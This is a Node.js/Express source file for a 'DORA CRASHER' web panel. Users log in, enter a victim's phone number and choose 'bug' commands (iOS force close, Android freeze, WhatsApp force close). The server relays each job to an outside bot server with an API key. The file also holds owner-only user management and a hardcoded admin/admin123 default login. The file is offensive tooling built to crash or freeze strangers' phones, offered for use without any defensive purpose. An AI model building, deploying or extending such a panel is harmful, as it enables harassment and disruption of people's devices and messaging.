const express = require("express");
const session = require("express-session");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");
const bcrypt = require("bcryptjs");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 3000;

const BOT_API_URL = process.env.BOT_API_URL || "https://my-panel.sachiya.online";
const BOT_API_KEY = process.env.BOT_API_KEY || "dora-crasher-secret-key";

const USERS_FILE = path.join(__dirname, "webusers.json");

if (!fs.existsSync(USERS_FILE)) {
    const defaultHash = bcrypt.hashSync("admin123", 10);
    fs.writeFileSync(USERS_FILE, JSON.stringify([{ username: "admin", password: defaultHash, role: "owner" }], null, 2));
}

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(session({
    secret: process.env.SESSION_SECRET || "dora-web-secret-key",
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

function requireLogin(req, res, next) {
    if (req.session.user) return next();
    res.redirect("/login");
}

function requireOwner(req, res, next) {
    if (req.session.user && req.session.user.role === "owner") return next();
    res.status(403).send("Access denied");
}

app.get("/", (req, res) => res.redirect("/login"));

app.get("/login", (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
<title>DORA CRASHER - LOGIN</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#0a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#111;padding:40px;border-radius:16px;border:1px solid #ff0033;width:90%;max-width:400px;box-shadow:0 0 40px rgba(255,0,51,0.3)}
h1{color:#ff0033;text-align:center;margin-bottom:24px;font-size:24px;letter-spacing:2px}
input{width:100%;padding:14px;margin:8px 0;background:#1a1a1a;border:1px solid #333;border-radius:8px;color:#fff;font-size:14px}
input:focus{outline:none;border-color:#ff0033}
button{width:100%;padding:14px;margin-top:16px;background:#ff0033;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;letter-spacing:1px}
button:hover{background:#cc0029}
.err{color:#ff0033;text-align:center;margin-top:12px;font-size:13px}
.tag{text-align:center;color:#666;font-size:11px;margin-top:20px;letter-spacing:2px}
</style>
</head>
<body>
<div class="box">
<h1>💀 DORA CRASHER 💀</h1>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Username" required autofocus>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button>
</form>
${req.query.err ? '<div class="err">❌ Invalid credentials</div>' : ''}
<div class="tag">OWNER @UnknownGuy9876 • @SGCodexs</div>
</div>
</body>
</html>`);
});

app.post("/login", (req, res) => {
    const { username, password } = req.body;
    const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
    const user = users.find(u => u.username === username);
    if (!user || !bcrypt.compareSync(password, user.password)) return res.redirect("/login?err=1");
    req.session.user = { username: user.username, role: user.role };
    res.redirect("/dashboard");
});

app.get("/logout", (req, res) => {
    req.session.destroy();
    res.redirect("/login");
});

app.get("/dashboard", requireLogin, (req, res) => {
    const isOwner = req.session.user.role === "owner";
    res.send(`<!DOCTYPE html>
<html>
<head>
<title>DORA CRASHER - PANEL</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
body{background:#0a0a0a;color:#fff;min-height:100vh;padding:20px}
.header{display:flex;justify-content:space-between;align-items:center;padding:16px 20px;background:#111;border:1px solid #ff0033;border-radius:12px;margin-bottom:20px}
.header h1{color:#ff0033;font-size:18px;letter-spacing:2px}
.user{color:#888;font-size:13px}
.badge{background:${isOwner ? '#ff0033' : '#333'};color:#fff;padding:4px 10px;border-radius:12px;font-size:11px;margin-left:8px}
.logout{color:#ff0033;text-decoration:none;font-size:13px;margin-left:12px}
.container{max-width:600px;margin:0 auto}
.card{background:#111;border:1px solid #222;border-radius:12px;padding:24px;margin-bottom:16px}
label{display:block;color:#888;font-size:12px;margin-bottom:8px;letter-spacing:1px;text-transform:uppercase}
input,select{width:100%;padding:14px;background:#1a1a1a;border:1px solid #333;border-radius:8px;color:#fff;font-size:14px}
input:focus,select:focus{outline:none;border-color:#ff0033}
button{width:100%;padding:16px;margin-top:20px;background:#ff0033;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:bold;cursor:pointer;letter-spacing:2px}
button:hover{background:#cc0029}
button:disabled{background:#333;cursor:not-allowed}
.result{margin-top:16px;padding:16px;background:#0d0d0d;border-left:3px solid #ff0033;border-radius:6px;font-family:monospace;font-size:13px;color:#0f0;white-space:pre-wrap;word-break:break-all}
.tag{text-align:center;color:#444;font-size:11px;margin-top:20px;letter-spacing:2px}
.admin-box{background:#111;border:1px solid #444;border-radius:12px;padding:24px;margin-bottom:16px}
.admin-box h2{color:#ff0033;font-size:14px;margin-bottom:16px;letter-spacing:1px}
</style>
</head>
<body>
<div class="header">
<h1>💀 DORA CRASHER PANEL</h1>
<div class="user">👤 ${req.session.user.username}<span class="badge">${isOwner ? 'OWNER' : 'USER'}</span><a href="/logout" class="logout">LOGOUT</a></div>
</div>
<div class="container">
<div class="card">
<label>📱 Target Number</label>
<input type="text" id="target" placeholder="947xxxxxxxx" autocomplete="off">
<label style="margin-top:20px;">🦠 Bug Command</label>
<select id="command">
<option value="IOSCRASH">IOSCRASH - iOS Force Close</option>
<option value="DORAIOS">DORAIOS - Infinite iOS Stuck</option>
<option value="frezewa">frezewa - Android Freeze</option>
<option value="fcbeta">fcbeta - Android Delay Beta</option>
<option value="andro">andro - Android Spam</option>
<option value="DelayHard">DelayHard - Close X Freeze</option>
<option value="buldozer">buldozer - Android Buldozer</option>
<option value="hima">hima - Fcinvisible</option>
<option value="DoraFc">DoraFc - Force Close WP</option>
</select>
<button id="execBtn" onclick="execute()">⚡ EXECUTE BUG ⚡</button>
<div id="result" class="result" style="display:none;"></div>
</div>
${isOwner ? `
<div class="admin-box">
<h2>👑 OWNER CONTROL</h2>
<label>Add User</label>
<input type="text" id="newUser" placeholder="Username" style="margin-bottom:8px;">
<input type="password" id="newPass" placeholder="Password" style="margin-bottom:8px;">
<select id="newRole" style="margin-bottom:8px;">
<option value="user">User</option>
<option value="owner">Owner</option>
</select>
<button onclick="addUser()" style="background:#0f0;color:#000;">➕ ADD USER</button>
<div id="adminResult" class="result" style="display:none;"></div>
</div>
` : ''}
<div class="tag">OWNER @UnknownGuy9876 • CHANNEL @SGCodexs</div>
</div>
<script>
async function execute(){
var target=document.getElementById('target').value.trim();
var command=document.getElementById('command').value;
var btn=document.getElementById('execBtn');
var result=document.getElementById('result');
if(!target){result.style.display='block';result.style.color='#ff0033';result.textContent='❌ Enter target number!';return}
btn.disabled=true;btn.textContent='⏳ EXECUTING...';
result.style.display='block';result.style.color='#ff0';result.textContent='⏳ Sending to bot...';
try{
var res=await fetch('/execute',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target:target,command:command})});
var data=await res.json();
result.style.color=data.success?'#0f0':'#ff0033';
result.textContent=data.message;
}catch(e){result.style.color='#ff0033';result.textContent='❌ Error: '+e.message}
btn.disabled=false;btn.textContent='⚡ EXECUTE BUG ⚡';
}
async function addUser(){
var u=document.getElementById('newUser').value.trim();
var p=document.getElementById('newPass').value.trim();
var r=document.getElementById('newRole').value;
var out=document.getElementById('adminResult');
if(!u||!p){out.style.display='block';out.style.color='#ff0033';out.textContent='❌ Fill all fields';return}
try{
var res=await fetch('/admin/adduser',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:u,password:p,role:r})});
var data=await res.json();
out.style.display='block';
out.style.color=data.success?'#0f0':'#ff0033';
out.textContent=data.message;
}catch(e){out.style.display='block';out.style.color='#ff0033';out.textContent='❌ Error: '+e.message}
}
</script>
</body>
</html>`);
});

app.post("/execute", requireLogin, async (req, res) => {
    const { target, command } = req.body;
    if (!target || !command) return res.json({ success: false, message: "❌ Missing target or command" });

    const cleanTarget = target.replace(/[^0-9]/g, "");
    if (cleanTarget.length < 10) return res.json({ success: false, message: "❌ Invalid number" });

    try {
        const response = await axios.post(
            BOT_API_URL + "/api/execute",
            {
                target: cleanTarget,
                command: command,
                user: req.session.user.username
            },
            {
                headers: {
                    "x-api-key": BOT_API_KEY,
                    "Content-Type": "application/json"
                },
                timeout: 10000
            }
        );

        res.json({
            success: true,
            message: "✅ Job queued!\nTarget: " + cleanTarget + "\nCommand: /" + command + "\n\n🦠 Bot executing..."
        });
    } catch (e) {
        const errMsg = e.response && e.response.data && e.response.data.message
            ? e.response.data.message
            : e.message;
        res.json({ success: false, message: "❌ Bot server error: " + errMsg });
    }
});

app.post("/admin/adduser", requireOwner, (req, res) => {
    const { username, password, role } = req.body;
    if (!username || !password) return res.json({ success: false, message: "❌ Fill all fields" });

    const users = JSON.parse(fs.readFileSync(USERS_FILE, "utf8"));
    if (users.find(u => u.username === username)) {
        return res.json({ success: false, message: "❌ Username exists" });
    }

    const hash = bcrypt.hashSync(password, 10);
    users.push({ username, password: hash, role: role || "user" });
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

    res.json({ success: true, message: "✅ User " + username + " added as " + (role || "user") });
});

app.listen(PORT, () => {
    console.log("✅ WEB PANEL RUNNING ON PORT " + PORT);
    console.log("👤 Default: admin / admin123");
});
